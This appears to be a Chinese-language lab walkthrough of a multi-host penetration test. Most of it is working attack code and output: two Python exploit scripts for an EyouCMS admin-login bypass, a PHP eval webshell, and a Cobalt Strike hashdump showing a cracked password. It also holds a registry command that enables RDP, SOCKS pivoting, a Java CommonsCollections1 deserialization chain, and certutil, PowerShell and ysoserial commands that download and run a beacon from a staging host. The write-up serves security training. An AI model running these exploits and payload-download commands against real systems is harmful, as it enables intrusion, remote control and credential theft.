# 靶场图

<img src=".\图片\Snipaste_2023-10-25_19-26-41.png" alt="Snipaste_2023-10-25_19-26-41" style="zoom:80%;" />

```
kali 192.168.10.5
主机win10 192.168.10.4
```

# web

## 信息搜集

1、探测端口

```bash
└─# nmap -sVC -sT -p- 192.168.10.14 
```

```bash
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
|_http-title: \xE5\x93\x8D\xE5\xBA\x94\xE5\xBC\x8F\xE9\x92\xA3\xE9\x87\x91\xE8\xAE\xBE\xE5\xA4\x87\xE5\x88\xB6\xE9\x80\xA0\xE7\xBD\x91\xE7\xAB\x99\xE6\xA8\xA1\xE6\x9D\xBF
| http-robots.txt: 3 disallowed entries 
|_/install_* /core /application
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp  open  mysql        MySQL (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```

首先尝试 80 端口

2、web指纹：EyouCms

<img src=".\图片\Snipaste_2023-10-25_19-30-34.png" alt="Snipaste_2023-10-25_19-30-34" style="zoom:80%;" />

3、全网搜索 EyouCms 已知漏洞，比起手动探测，这个优先级更高

https://forum.butian.net/share/104

https://www.cnblogs.com/Pan3a/p/14880225.html

代码审计放一旁，不求甚解先利用，找到两个exp，其实看看exp也能大致猜测发生了什么

exp1：

```python
#coding:utf-8
from time import sleep

import requests
header={'x-requested-with':'xmlhttprequest'}
url="http://192.168.10.14/?m=api&c=Ajax&a=get_token&name=admin_id"
r = requests.session()
res = r.get(url,headers = header)
if 'Set-cookie' in res.headers:
    print(res.headers['Set-cookie'])

while True:
    url = "http://192.168.10.14/?m=api&c=Ajax&a=get_token&name=admin_login_expire"
    req = r.get(url,headers = header)
    print(req.text)
    houtai = "http://192.168.10.14/login.php?m=admin&c=Admin&a=admin_edit&id=1&lang=cn"
    req2 = r.get(url=houtai, headers=header)
    if req2.status_code ==200:
        print(req2.text)
        break
while True:
    url2 ="http://192.168.10.14/?m=api&c=Ajax&a=get_token&name=admin_info.role_id"
    req3 = r.get(url=url2,headers=header)
    houtai = "http://192.168.10.14//login.php?m=admin&c=Admin&a=admin_edit&id=1&lang=cn"
    req4 = r.get(url=houtai, headers=header)
    if '用户头像' in req4.text:
        print("ok")
        print(res.headers['set-cookie'])
        break
```

exp2：

```python
from time import time, sleep
import requests
import sys


class EyouCMS:
    def __init__(self, URL):
        self.Req = requests.session()
        self.URL = URL
        self.SleepTime = 0.5
        self.AdminURL = 'login.php?m=admin&c=Admin&a=admin_edit&id=1&lang=cn'
        self.Payload = 'index.php/?m=api&c=ajax&a=get_token&name='
        self.admin_id = 'admin_id'
        self.admin_login_expire = 'admin_login_expire'
        self.admin_info_role_id = 'admin_info.role_id'
        self.Headers = {
            'x-requested-with': 'XMLHttpRequest',
        }

    def Banner(self):
        print("-" * 10 + "后台登录绕过" + "-" * 10)

    def change(self, string):
        temp = ''
        for n, s in enumerate(string):
            if n == 0:
                if s.isalpha():
                    return '0'
                    break
            if s.isdigit():
                temp += str(s)
            else:
                if s.isalpha():
                    break
        return temp

    def SetID(self):
        res = self.Req.get(self.URL + self.Payload + self.admin_id, headers=self.Headers)
        print("admin_id[+]:\t\t\t\t\t" + res.text)
        if 'Set-cookie' in res.headers:
            print(res.headers['set-cookie'])
        if res.status_code != 200:
            sys.exit("Api模块请求404")
        # print(res.headers)

    def SetExpire(self):
        while True:
            res = self.Req.get(self.URL + self.Payload + self.admin_login_expire, headers=self.Headers)
            # print(res.text,end='\t\t\t\t')
            # print(self.change(res.text))
            if (time() - int(self.change(res.text), 10) < 3600):
                print("admin_login_expire[+]:\t\t\t" + res.text)
                # print(res.headers)
                break
            sleep(self.SleepTime)

    def SetRoleID(self):
        while True:
            res = self.Req.get(self.URL + self.Payload + self.admin_info_role_id, headers=self.Headers)
            if (int(self.change(res.text), 10) <= 0):
                print("admin_info.rele_id[+]:\t\t\t" + res.text)
                break
            sleep(self.SleepTime)

    def CheckLogin(self):
        res = self.Req.get(self.URL + self.AdminURL, headers=self.Headers)
        res.encoding = res.apparent_encoding
        if '更换头像' in res.text:
            print("OK")

    def run(self):
        self.SetID()
        self.SetExpire()
        self.SetRoleID()
        self.CheckLogin()


if __name__ == '__main__':
    Start = time()
    URL = 'http://192.168.10.14/'
    e = EyouCMS(URL)
    e.run()
    End = time()
    print(End - Start)
```

## 已知漏洞利用

```bash
python eyoucms2.py
```

```
admin_id[+]:                                    c8b3fb7929f9fd315ac0bdbc6728efc4
home_lang=cn; path=/, admin_lang=cn; path=/, PHPSESSID=eihfcpk6d4vgnh2ubmdlvqteb8; expires=Wed, 25-Oct-2023 12:41:05 GMT; Max-Age=3600; path=/
admin_login_expire[+]:                  8798998207bdb9d5b34a6bda8c8f0eb2
admin_info.rele_id[+]:                  a7a18766e60a7c04b2445cc9892334a2
OK
14.69934368133545
```

再浏览器 cookie editor 插件修改cookie 后登录后台 

<img src=".\图片\Snipaste_2023-10-25_19-44-30.png" alt="Snipaste_2023-10-25_19-44-30" style="zoom:80%;" />

## 后台getshell

在模版编辑里修改代码写 shell 

```
<?=eval($_POST[x]);
```

常规shell还不行，必须得是这种

<img src=".\图片\Snipaste_2023-10-25_19-59-56.png" alt="Snipaste_2023-10-25_19-59-56" style="zoom:80%;" />

gsl 连接

我是在主页 index.htm 里插入的shell  http://192.168.10.14/

<img src=".\图片\Snipaste_2023-10-25_20-04-58.png" alt="Snipaste_2023-10-25_20-04-58" style="zoom:80%;" />

## 上线cs

至于上传 exe ，是用 gsl 的上传功能实现的。抓取本机 hash

```
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 83198 bytes
[+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c51ba7c328cd01866885a37748816e07:::  这个解密 QWEadmin123
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

稳定下权限，进程注入

<img src=".\图片\Snipaste_2023-10-25_20-47-03.png" alt="Snipaste_2023-10-25_20-47-03" style="zoom:80%;" />

## 开启远程桌面

```
beacon> shell REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

```
administrator:QWEadmin123
```

<img src=".\图片\Snipaste_2023-10-25_21-15-09.png" alt="Snipaste_2023-10-25_21-15-09" style="zoom:80%;" />

如此甚好

## 本机二次信息搜集

查看桌面 账号.txt

```
moonsec 123456
100 123456
```

开启 qqclient.jar 看看

```
set JAVA_HOME="C:\Program Files\java\jdk1.8.0_65"
set PATH=%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;
set CLASSPATH=.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar
java -jar C:\Users\Administrator\Desktop\QQclient.jar
```

<img src=".\图片\Snipaste_2023-10-25_21-28-00.png" alt="Snipaste_2023-10-25_21-28-00" style="zoom:80%;" />

# data

## 信息搜集

在 web 主机 的 cs 的 beacon 里对 data 主机做信息搜集

再到装有 cs 的 kali 里 开启 正向 代理，使 kali 能摸到 data

```
beacon> socks 49510
```

kali：

```
└─# vim /etc/proxychains4.conf 
socks4 127.0.0.1 49510
```



测试连接 192.168.22.146  445 ，成功

```bash
└─# proxychains4 nmap -sT -Pn 192.168.22.146 -p 445
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-25 08:51 EDT
[proxychains] Strict chain  ...  127.0.0.1:49510  ...  192.168.22.146:445  ...  OK
Nmap scan report for 192.168.22.146 (192.168.22.146)
Host is up (0.099s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
```

接下来对 192.168.22.146 来端口扫描

```bash
└─# proxychains4 nmap -sT -Pn 192.168.22.146 -p80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389,9999,8010

PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
9999/tcp open  abyss
```



大概 data 的这个 9999 端口 运行的就是 qqclient.jar ，在我们拿下的主机 web 里能找到源码

## java代码审计

把 qqclient.jar 下到本地，jdgui 查看源码

```java
public boolean checkUser(String userId, String pwd) {
    this.u.setUserId(userId);
    this.u.setPasswd(pwd);
    boolean b = false;
    try {
      this.socket = new Socket(InetAddress.getByName("192.168.22.146"), 9999);
      ObjectOutputStream oos = new ObjectOutputStream(this.socket.getOutputStream());
      oos.writeObject(this.u);
      ObjectInputStream ois = new ObjectInputStream(this.socket.getInputStream());
      Message ms = (Message)ois.readObject(); //反序列化的起点，接受信息，用户可控
      if (ms.getMesType().equals("1")) {
        ClientConnectServerThread ClientConnectServerThread = new ClientConnectServerThread(this.socket);
        ClientConnectServerThread.start();
        ManageClientConnectServerThread.addClientConnectServerThread(userId, ClientConnectServerThread);
        b = true;
      } else {
        this.socket.close();
      } 
    } catch (Exception e) {
      e.printStackTrace();
    } 
    return b;
  }
```

## cc1利用

从web服务器中看到的java版本是 jdk1.8.0_65 这个版本是能够使用 cc1这条反序列化链接的

在 cs 的 web 的权限里开启转发上线，配置后门到web路径里  `http://192.168.22.152/1.exe`

可以用 cc1

先把执行的命令整理下

```
certutil -urlcache -split -f http://192.168.22.152/1.exe C:/windows/temp/1.exe
C:/windows/temp/1.exe

powershell (new-object
System.Net.WebClient).DownloadFile('http://192.168.22.152/1.exe','c:\\windows\\temp\\evil.exe')
c:\\evil.exe
```



cc1 本地运行

```java
@Test
    public void test_10() throws Exception {
        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"certutil -urlcache -split -f http://192.168.22.152/1.exe C:/windows/temp/1.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<Object, Object>();
        map.put("value", "s"); //设置map的值
        Map<Object, Object> TransformedMapMethod =
                TransformedMap.decorate(map, null, chainedTransformer);
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> annotationInvocationConstructor =
                c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationConstructor.setAccessible(true);
        Object o = annotationInvocationConstructor.newInstance(Target.class, TransformedMapMethod);
        serialize(o);
//        unserialize();
    }

public static void serialize(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream( new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }
public static void unserialize() throws  Exception{
        ObjectInputStream inputStream = new ObjectInputStream( new FileInputStream("ser.bin"));
        Object obj = inputStream.readObject();
```



用 nc 来传输

```
type ser.bin | nc64.exe -vn 192.168.22.146 9999
```

我打的 是 lazymap 的 cc1，cc1 都行 

进入 data 靶机看看，成功看到下载

<img src=".\图片\Snipaste_2023-10-25_22-18-14.png" alt="Snipaste_2023-10-25_22-18-14" style="zoom:80%;" />



此外还可以用工具

```bash
java -jar ysoserial-0.0.5-all.jar CommonsCollections1 "certutil -urlcache -split -f http://192.168.22.152/beacon.exe C:/windows/temp/cs.exe" > ser.bin

java -jar ysoserial-0.0.5-all.jar CommonsCollections1 "C:/windows/temp/cs.exe" > ser.bin
```

cs 上线：

<img src=".\图片\Snipaste_2023-10-25_22-33-20.png" alt="Snipaste_2023-10-25_22-33-20" style="zoom:67%;" />



# ad

CVE-2020-1472（ZeroLogon）

不做了，之前做过很多次了
